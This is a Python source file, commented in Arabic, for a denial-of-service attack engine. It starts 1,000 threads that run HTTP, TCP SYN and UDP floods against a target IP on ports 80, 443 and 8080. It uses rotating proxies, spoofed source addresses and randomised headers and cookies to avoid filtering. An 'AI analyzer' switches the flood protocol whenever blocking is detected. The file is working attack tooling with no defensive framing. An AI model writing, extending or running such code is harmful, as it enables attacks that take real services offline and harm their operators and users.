import threading
import time
import random
from core import proxy_rotator  # يجب أن توفر وحدة proxy_rotator قوية تدير البروكسيات
from protocols import http_flood, tcp_syn, udp_flood
from core.ai_analyzer import AIAttackAnalyzer


class AttackEngine:
    def __init__(self, target_ip, ports, threads=1000):
        self.target_ip = target_ip
        self.ports = ports
        self.threads_count = threads
        self.protocols = ["HTTP", "TCP", "UDP"]
        self.protocol_status = {p: True for p in self.protocols}
        self.current_protocol = "HTTP"
        self.running = False
        self.active_threads = []
        self.lock = threading.Lock()

        # بدء محلل الذكاء الاصطناعي مع دالة رد نداء لتغيير البروتوكول
        self.ai_analyzer = AIAttackAnalyzer(
            target_ip=self.target_ip,
            control_callback=self.protocol_change_handler,
            protocols=self.protocols,
            max_blocked_before_switch=3,
            http_port=80,
            tcp_port=80,
            udp_port=80,
            timeout=5,
            check_interval=5
        )

    def protocol_change_handler(self, new_protocol):
        with self.lock:
            print(f"[AI] تغيير البروتوكول النشط من {self.current_protocol} إلى {new_protocol}")
            self.current_protocol = new_protocol
            # تعيين حالة البروتوكولات بحيث يبقى فقط الجديد مفعل
            for p in self.protocol_status:
                self.protocol_status[p] = (p == new_protocol)

    def start(self):
        self.running = True
        print(f"[AttackEngine] بدء الهجوم على {self.target_ip} باستخدام {self.threads_count} خيوط عبر منافذ {self.ports}")

        # بدء محلل الذكاء الاصطناعي في Thread منفصل
        self.ai_analyzer.start()

        # بدء خيوط الهجوم
        for port in self.ports:
            for _ in range(self.threads_count // len(self.ports)):
                t = threading.Thread(target=self.attack_thread, args=(port,))
                t.daemon = True
                t.start()
                self.active_threads.append(t)

    def stop(self):
        print("[AttackEngine] إيقاف الهجوم...")
        self.running = False
        self.ai_analyzer.stop()
        self.ai_analyzer.join()
        for t in self.active_threads:
            if t.is_alive():
                t.join(timeout=1)
        print("[AttackEngine] تم الإيقاف الكامل.")

    def attack_thread(self, port):
        while self.running:
            with self.lock:
                protocol = self.current_protocol
                enabled = self.protocol_status.get(protocol, False)

            if not enabled:
                time.sleep(0.1)
                continue

            proxy = proxy_rotator.get_random_proxy()  # توقع أن تعيد str: "ip:port" أو None
            try:
                if protocol == "HTTP":
                    headers = self.random_headers()
                    http_flood.attack(self.target_ip, port, headers=headers, proxy=proxy)
                elif protocol == "TCP":
                    tcp_syn.attack(self.target_ip, port, packet_size=1024, ip_source=proxy)
                elif protocol == "UDP":
                    udp_flood.attack(self.target_ip, port, packet_size=512, ip_source=proxy)
                else:
                    time.sleep(0.05)
            except Exception as e:
                print(f"[AttackEngine] خطأ في هجوم {protocol} على {port}: {e}")

            time.sleep(0.001)  # تفادي التحميل الزائد على النظام

    @staticmethod
    def random_headers():
        user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.1 Safari/605.1.15",
            "Mozilla/5.0 (X11; Linux x86_64) Gecko/20100101 Firefox/112.0",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/112.0.0.0"
        ]
        return {
            "User-Agent": random.choice(user_agents),
            "Referer": "https://google.com/search?q=" + str(random.randint(1000, 9999)),
            "Cookie": "session=" + str(random.randint(100000, 999999))
        }


if __name__ == "__main__":
    engine = AttackEngine(target_ip="1.2.3.4", ports=[80, 443, 8080], threads=1000)
    try:
        engine.start()
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        engine.stop()
